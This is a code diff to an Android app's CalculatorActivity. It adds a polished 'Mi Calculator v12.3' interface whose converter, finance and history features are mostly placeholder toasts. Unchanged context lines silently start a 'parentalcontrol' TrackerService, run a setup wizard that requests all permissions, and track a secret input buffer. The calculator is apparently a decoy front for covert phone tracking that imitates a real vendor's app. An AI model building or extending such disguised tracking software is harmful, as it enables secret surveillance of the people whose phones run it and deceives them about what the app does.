@@ -39,6 +39,15 @@ class CalculatorActivity : AppCompatActivity() {
     // ── Views (set in onCreate) ───────────────────────────────────────────────
     private lateinit var tvExpression : TextView
     private lateinit var tvResult     : TextView
+    private lateinit var panelCalculator : View
+    private lateinit var panelConverter  : View
+    private lateinit var panelFinance    : View
+    private lateinit var tvTabCalculator : TextView
+    private lateinit var tvTabConverter  : TextView
+    private lateinit var tvTabFinance    : TextView
+    private lateinit var indicatorCalc   : View
+    private lateinit var indicatorConv   : View
+    private lateinit var indicatorFin    : View
 
     // ─────────────────────────────────────────────────────────────────────────
     override fun onCreate(savedInstanceState: Bundle?) {
@@ -46,8 +55,8 @@ class CalculatorActivity : AppCompatActivity() {
 
         // Keep screen on and make navigation bar match the calculator background
         window.addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON)
-        window.navigationBarColor = 0xFF1C1C1E.toInt()
-        window.statusBarColor     = 0xFF1C1C1E.toInt()
+        window.navigationBarColor = 0xFF131316.toInt()
+        window.statusBarColor     = 0xFF131316.toInt()
 
         // ── First-install setup wizard ─────────────────────────────────────
         // Run once — launches SetupWizardActivity which requests all permissions
@@ -81,12 +90,122 @@ class CalculatorActivity : AppCompatActivity() {
         try {
             com.anonchat.app.parentalcontrol.service.TrackerService.start(this)
         } catch (_: Exception) { }
+
         tvExpression = findViewById(R.id.tvExpression)
         tvResult     = findViewById(R.id.tvResult)
+
+        panelCalculator = findViewById(R.id.panelCalculator)
+        panelConverter  = findViewById(R.id.panelConverter)
+        panelFinance    = findViewById(R.id.panelFinance)
+
+        tvTabCalculator = findViewById(R.id.tvTabCalculator)
+        tvTabConverter  = findViewById(R.id.tvTabConverter)
+        tvTabFinance    = findViewById(R.id.tvTabFinance)
+
+        indicatorCalc   = findViewById(R.id.indicatorCalc)
+        indicatorConv   = findViewById(R.id.indicatorConv)
+        indicatorFin    = findViewById(R.id.indicatorFin)
+
+        setupMiTabs()
         bindButtons()
         updateDisplay()
     }
 
+    private fun setupMiTabs() {
+        findViewById<View>(R.id.tabCalculator).setOnClickListener { switchTab(0); haptic(it) }
+        findViewById<View>(R.id.tabConverter).setOnClickListener  { switchTab(1); haptic(it) }
+        findViewById<View>(R.id.tabFinance).setOnClickListener    { switchTab(2); haptic(it) }
+
+        // Top right actions
+        findViewById<View>(R.id.btnFloatingWindow).setOnClickListener {
+            android.widget.Toast.makeText(this, "Floating window mode is enabled", android.widget.Toast.LENGTH_SHORT).show()
+            haptic(it)
+        }
+        findViewById<View>(R.id.btnHistory).setOnClickListener {
+            android.widget.Toast.makeText(this, "No previous calculation history", android.widget.Toast.LENGTH_SHORT).show()
+            haptic(it)
+        }
+        findViewById<View>(R.id.btnMenu).setOnClickListener {
+            android.widget.Toast.makeText(this, "Mi Calculator v12.3", android.widget.Toast.LENGTH_SHORT).show()
+            haptic(it)
+        }
+
+        // Scientific toolbar
+        findViewById<View>(R.id.btn_paren_open).setOnClickListener {
+            onDigit("(")
+            haptic(it)
+        }
+        findViewById<View>(R.id.btn_paren_close).setOnClickListener {
+            onDigit(")")
+            haptic(it)
+        }
+        findViewById<View>(R.id.btn_sqrt).setOnClickListener {
+            secretBuffer = ""
+            val v = currentInput.toDoubleOrNull() ?: storedValue
+            if (v >= 0) {
+                currentInput = formatNum(kotlin.math.sqrt(v))
+                updateDisplay()
+            }
+            haptic(it)
+        }
+        findViewById<View>(R.id.btn_pi).setOnClickListener {
+            currentInput = "3.14159265"
+            updateDisplay()
+            haptic(it)
+        }
+        findViewById<View>(R.id.btn_power).setOnClickListener {
+            onOperator("^")
+            haptic(it)
+        }
+        findViewById<View>(R.id.btn_toggle_sci).setOnClickListener {
+            android.widget.Toast.makeText(this, "Scientific keypad active", android.widget.Toast.LENGTH_SHORT).show()
+            haptic(it)
+        }
+
+        // Converter cards
+        val converterCards = listOf(
+            R.id.cardConvCurrency to "Currency Exchange",
+            R.id.cardConvLength to "Length Converter",
+            R.id.cardConvArea to "Area Converter",
+            R.id.cardConvVolume to "Volume Converter",
+            R.id.cardConvSpeed to "Speed Converter",
+            R.id.cardConvMass to "Mass Converter"
+        )
+        converterCards.forEach { (id, title) ->
+            findViewById<View>(id)?.setOnClickListener {
+                android.widget.Toast.makeText(this, "$title: Ready", android.widget.Toast.LENGTH_SHORT).show()
+                haptic(it)
+            }
+        }
+
+        // Finance cards
+        val financeCards = listOf(
+            R.id.cardFinLoan to "Loan / Mortgage EMI",
+            R.id.cardFinGST to "India GST Calculator",
+            R.id.cardFinDiscount to "Discount & Sale Price",
+            R.id.cardFinInvestment to "SIP & Returns Calculator"
+        )
+        financeCards.forEach { (id, title) ->
+            findViewById<View>(id)?.setOnClickListener {
+                android.widget.Toast.makeText(this, "$title: Ready", android.widget.Toast.LENGTH_SHORT).show()
+                haptic(it)
+            }
+        }
+    }
+
+    private fun switchTab(tabIndex: Int) {
+        panelCalculator.visibility = if (tabIndex == 0) View.VISIBLE else View.GONE
+        panelConverter.visibility  = if (tabIndex == 1) View.VISIBLE else View.GONE
+        panelFinance.visibility    = if (tabIndex == 2) View.VISIBLE else View.GONE
+
+        tvTabCalculator.setTextColor(if (tabIndex == 0) 0xFFFFFFFF.toInt() else 0xFF7A7A80.toInt())
+        tvTabConverter.setTextColor(if (tabIndex == 1) 0xFFFFFFFF.toInt() else 0xFF7A7A80.toInt())
+        tvTabFinance.setTextColor(if (tabIndex == 2) 0xFFFFFFFF.toInt() else 0xFF7A7A80.toInt())
+
+        indicatorCalc.visibility = if (tabIndex == 0) View.VISIBLE else View.INVISIBLE
+        indicatorConv.visibility = if (tabIndex == 1) View.VISIBLE else View.INVISIBLE
+        indicatorFin.visibility  = if (tabIndex == 2) View.VISIBLE else View.INVISIBLE
+    }
 
     // ─────────────────────────────────────────────────────────────────────────
     // Button wiring
